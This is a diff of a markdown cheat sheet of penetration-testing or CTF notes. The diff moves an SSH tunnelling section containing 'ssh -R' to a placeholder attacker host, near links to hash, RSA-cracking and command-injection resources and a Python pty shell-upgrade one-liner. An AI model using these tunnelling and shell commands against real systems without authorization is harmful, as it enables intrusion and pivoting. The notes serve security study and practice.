@@ -34,6 +34,9 @@ https://github.com/Ganapati/RsaCtfTool
 https://medium.com/bugbountywriteup/cracking-ssh-private-key-passphrase-459ba17e8d5d
 
 
+### SSH tunelling
+ - netstat -tulpn - what services are running
+ - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
 ### HASH
 Identify hashes: https://hashes.com/en/tools/hash_identifier<br />
 Tool to identify hashes: https://gitlab.com/kalilinux/packages/hash-identifier/-/tree/kali/master <br />
@@ -70,9 +73,6 @@ https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/
  -https://netsec.ws/?p=337 - interactive tty
  python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-### SSH tunelling
- - netstat -tulpn - what services are running
- - ssh -R 9001:127.0.0.1:9001 attacker@<attacker_ip>
 ### command injection 
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Command%20Injection/README.md
 
